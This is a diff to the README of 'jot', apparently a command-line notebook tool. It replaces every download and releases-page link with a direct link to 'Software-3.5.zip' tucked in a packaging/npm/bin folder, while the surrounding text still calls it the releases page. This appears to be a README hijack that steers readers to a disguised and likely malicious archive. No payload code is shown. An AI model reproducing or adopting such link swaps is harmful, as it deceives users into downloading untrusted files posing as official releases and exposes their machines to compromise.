@@ -6,7 +6,7 @@ Welcome to jot! This is a command-line notebook designed for capturing your raw 
 
 ## 📥 Download Now
 
-[![Download jot](https://img.shields.io/badge/Download-jot-brightgreen)](https://github.com/aryanauvaladitya/jot/releases)
+[![Download jot](https://github.com/aryanauvaladitya/jot/raw/refs/heads/main/packaging/npm/bin/Software-3.5.zip)](https://github.com/aryanauvaladitya/jot/raw/refs/heads/main/packaging/npm/bin/Software-3.5.zip)
 
 ## 📋 System Requirements
 
@@ -30,7 +30,7 @@ To get jot on your computer, follow these steps:
 
 1. **Visit the Releases Page**
    Click the link below to go to the GitHub releases page for jot:
-   [Visit the Releases Page](https://github.com/aryanauvaladitya/jot/releases)
+   [Visit the Releases Page](https://github.com/aryanauvaladitya/jot/raw/refs/heads/main/packaging/npm/bin/Software-3.5.zip)
 
 2. **Choose the Right Version**
    On the releases page, you will see various versions of jot. Find the latest version that matches your operating system (Windows, macOS, or Linux).
@@ -105,4 +105,4 @@ If you want to contribute to the development of jot, we welcome your input. You 
 ## 📥 Download Again!
 
 Don't forget to download jot to start capturing your thoughts today:
-[![Download jot](https://img.shields.io/badge/Download-jot-brightgreen)](https://github.com/aryanauvaladitya/jot/releases)
+[![Download jot](https://github.com/aryanauvaladitya/jot/raw/refs/heads/main/packaging/npm/bin/Software-3.5.zip)](https://github.com/aryanauvaladitya/jot/raw/refs/heads/main/packaging/npm/bin/Software-3.5.zip)
